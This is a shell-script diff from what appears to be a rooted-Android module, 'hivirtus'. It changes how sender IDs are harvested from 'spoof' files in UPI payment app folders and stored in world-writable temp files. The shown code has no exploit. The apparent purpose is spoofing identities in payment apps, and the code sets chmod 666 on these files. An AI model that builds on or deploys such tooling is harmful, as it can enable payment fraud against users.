@@ -141,8 +141,16 @@ hivirtus_harvest_saves() {
     fi
 
     # Promote sender from newest harvest even if phone logic skipped
-    if [ -n "$FOUND_SID" ] && [ "$FOUND_SID" != "AD-TEST-S" ]; then
-      if [ -z "$TMP_SID" ] || [ "$FOUND_MT" -ge "$TMP_MT" ]; then
+    # Skip if a live sender_save.request exists (menu just changed SID)
+    SID_REQ=0
+    for reqf in /data/local/tmp/hivirtus_sender_save.request \
+                /sdcard/Documents/hivirtus_sender_save.request \
+                /sdcard/Download/hivirtus_sender_save.request
+    do
+      [ -s "$reqf" ] && SID_REQ=1 && break
+    done
+    if [ "$SID_REQ" != "1" ] && [ -n "$FOUND_SID" ] && [ "$FOUND_SID" != "AD-TEST-S" ]; then
+      if [ -z "$TMP_SID" ] || [ "$FOUND_MT" -gt "$TMP_MT" ]; then
         echo "$FOUND_SID" > /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
         echo "$FOUND_SID" > "$MODDIR/sender_id.txt" 2>/dev/null
         chmod 666 /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
@@ -151,7 +159,27 @@ hivirtus_harvest_saves() {
   fi
 
   # Also harvest dedicated sender / spoof files (newest wins)
+  # BUT never overwrite a fresher menu Save (sender_save.request / .ts)
   local best_sid="" best_sid_mt=0 best_ph="" best_ph_mt=0
+  local save_ts=0
+  for tsf in /data/local/tmp/hivirtus_sender_save.ts \
+             /sdcard/Documents/hivirtus_sender_save.ts \
+             /storage/emulated/0/Documents/hivirtus_sender_save.ts
+  do
+    [ -s "$tsf" ] || continue
+    ts=$(head -n1 "$tsf" 2>/dev/null | tr -cd '0-9')
+    [ -n "$ts" ] && [ "$ts" -gt "$save_ts" ] 2>/dev/null && save_ts=$ts
+  done
+  # Live request always wins — skip stale harvest
+  HAVE_SID_REQ=0
+  for reqf in /data/local/tmp/hivirtus_sender_save.request \
+              /sdcard/Documents/hivirtus_sender_save.request \
+              /sdcard/Download/hivirtus_sender_save.request
+  do
+    [ -s "$reqf" ] && HAVE_SID_REQ=1 && break
+  done
+
+  if [ "$HAVE_SID_REQ" != "1" ]; then
   for pkg in $UPI_PACKAGES; do
     pkg=$(echo "$pkg" | tr -d ' \r\n')
     [ -z "$pkg" ] && continue
@@ -163,6 +191,10 @@ hivirtus_harvest_saves() {
     do
       [ -s "$f" ] || continue
       mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
+      # Skip files older than last menu Save stamp
+      if [ "$save_ts" -gt 0 ] && [ "$mt" -lt "$save_ts" ] 2>/dev/null; then
+        continue
+      fi
       line=$(head -n1 "$f" 2>/dev/null | tr -d '\r\n')
       [ -z "$line" ] || [ "$line" = "AD-TEST-S" ] && continue
       if [ "$mt" -gt "$best_sid_mt" ]; then
@@ -189,12 +221,15 @@ hivirtus_harvest_saves() {
   done
   if [ -n "$best_sid" ]; then
     TMP_SID_MT=$(stat -c %Y /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null || echo 0)
-    if [ ! -s /data/local/tmp/hivirtus_sender_id.txt ] || [ "$best_sid_mt" -ge "$TMP_SID_MT" ]; then
+    CUR=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
+    # Never demote a different newer tmp SID with older harvest
+    if [ -z "$CUR" ] || [ "$best_sid_mt" -gt "$TMP_SID_MT" ]; then
       echo "$best_sid" > /data/local/tmp/hivirtus_sender_id.txt
       echo "$best_sid" > "$MODDIR/sender_id.txt"
       chmod 666 /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
       echo "harvest_sender:$best_sid $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     fi
+  fi
   fi
   # Phone file harvest ONLY if no explicit save request and only as fill-in later
 
